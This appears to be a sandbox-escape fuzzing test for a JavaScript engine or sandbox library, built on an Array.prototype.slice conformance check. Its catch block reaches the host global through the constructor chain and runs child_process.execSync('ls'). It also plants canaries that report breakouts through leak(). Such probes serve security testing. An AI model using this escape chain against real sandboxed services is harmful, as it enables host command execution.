try {
    var arrayLike = {
        '9007199254740988': '9007199254740988',
        '9007199254740989': '9007199254740989',
        '9007199254740990': '9007199254740990',
        '9007199254740991': '9007199254740991',
        length: 2 ** 53 + 2
    };
    var result = Array.prototype.slice.call(arrayLike, 9007199254740989);
    assert.compareArray(result, [
        '9007199254740989',
        '9007199254740990'
    ], 'slice(9007199254740989)');
    var result = Array.prototype.slice.call(arrayLike, 9007199254740989, 9007199254740990);
    assert.compareArray(result, ['9007199254740989'], 'slice(9007199254740989, 9007199254740990)');
    var result = Array.prototype.slice.call(arrayLike, 9007199254740989, 9007199254740996);
    assert.compareArray(result, [
        '9007199254740989',
        '9007199254740990'
    ], 'slice(9007199254740989, 9007199254740996)');
    var result = Array.prototype.slice.call(arrayLike, -2);
    assert.compareArray(result, [
        '9007199254740989',
        '9007199254740990'
    ], 'slice(-2)');
    var result = Array.prototype.slice.call(arrayLike, -2, -1);
    assert.compareArray(result, ['9007199254740989'], 'slice(-2, -1)');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}